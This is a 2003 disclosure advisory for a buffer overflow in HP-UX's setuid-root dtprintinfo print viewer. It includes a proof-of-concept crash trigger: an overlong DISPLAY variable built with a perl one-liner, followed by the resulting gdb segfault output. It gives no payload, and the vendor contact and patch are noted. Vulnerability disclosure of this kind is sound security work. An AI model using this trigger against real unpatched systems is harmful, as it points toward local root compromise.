=======================================================
  HPUX dtprintinfo buffer overflow vulnerability
=======================================================

Davide Del Vecchio Adv#7

Discovered in: 14/07/2003
Date: 08/10/2003
Tested on HP-UX B.11.00

Description:

The Print Viewer program provides a graphical interface that displays
the status of print queues and print jobs.

dante@sofficino :/usr/dt/bin >ls -al /usr/dt/bin/dtprintinfo
 -r-sr-xr-x   1 root       bin         471040 Sep 22  2000 dtprintinfo

Exporting the DISPLAY variable with a long argument...

dante@sofficino :/usr/dt/bin >export DISPLAY="`perl -e 'printf "A" x 9777'`"
dante@sofficino :/usr/dt/bin >/usr/dt/bin/dtprintinfo
Memory fault

 From gdb output we can see:

Program received signal SIGSEGV, Segmentation fault.
0x7f75fb08 in memcpy () from /usr/lib/libc.2

Solution:

I'm in contact with HP's Security staff, especially with John Morris,
and I would like to thanks him and all his staff for the interest
demonstrated during this period of research on HP-UX.
He assured me a patch has been written and an Official Security Bullettin
will follow my advisory.

Credits:

Davide Del Vecchio would like to thank all the people supporting him
and his research, his love that never leaves him alone, and obvious,
the HP-UX security staff, impersonified in this case by John Morris.
